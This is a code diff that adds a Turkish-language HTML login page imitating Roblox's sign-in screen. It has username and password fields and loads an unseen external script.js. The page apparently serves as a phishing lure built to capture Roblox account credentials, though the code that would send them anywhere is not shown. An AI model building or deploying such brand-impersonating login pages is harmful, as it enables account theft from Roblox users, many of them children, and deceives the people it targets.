@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        body { font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #F2F4F5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); width: 400px; text-align: center; }
+        h1 { font-size: 22px; font-weight: 700; margin-bottom: 20px; color: #454B4E; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #B8BFC4; border-radius: 3px; box-sizing: border-box; background-color: #F2F4F5; }
+        button { width: 100%; padding: 12px; background-color: #0084FF; border: none; color: white; font-weight: bold; border-radius: 3px; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #0074E0; }
+        .footer-links { margin-top: 20px; font-size: 13px; color: #0084FF; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Roblox'a Giriş Yap</h1>
+        <form id="login-form">
+            <input type="text" id="user" placeholder="Kullanıcı Adı / E-posta / Telefon" required>
+            <input type="password" id="pass" placeholder="Şifre" required>
+            <button type="submit" id="login-btn">Giriş Yap</button>
+        </form>
+        <div class="footer-links">Şifreni mi unuttun?</div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
